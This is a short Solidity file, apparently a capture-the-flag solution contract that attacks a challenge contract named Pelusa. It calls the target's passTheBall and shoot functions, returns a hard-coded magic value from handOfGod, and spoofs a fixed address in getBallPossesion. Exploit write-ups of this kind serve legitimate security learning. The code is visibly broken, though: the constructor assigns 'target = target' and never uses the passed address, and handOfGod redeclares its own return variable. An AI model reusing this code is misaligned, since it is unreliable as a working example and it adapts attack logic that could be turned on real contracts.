// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "../instances/Pelusa.sol";

contract PelusaSolution is IGame {
    Pelusa target;
    constructor(address _target) {
        target = target;
        target.passTheBall();
    }

    function attack() external {
        target.shoot();
    } 

    function handOfGod() external returns (bool success, bytes memory data)  {
        // bytes memory data = bytes(bytes10(uint80(int80(22_06_1968))));
        bytes memory data = abi.encodePacked(uint256(22_06_1968));
        return (true,  data);
    }

    function getBallPossesion() external view returns (address) {
        return 0x7eEEfE54f86Ce065a68C3B0f6c4B3d9bfB491Ad6;
    }
}
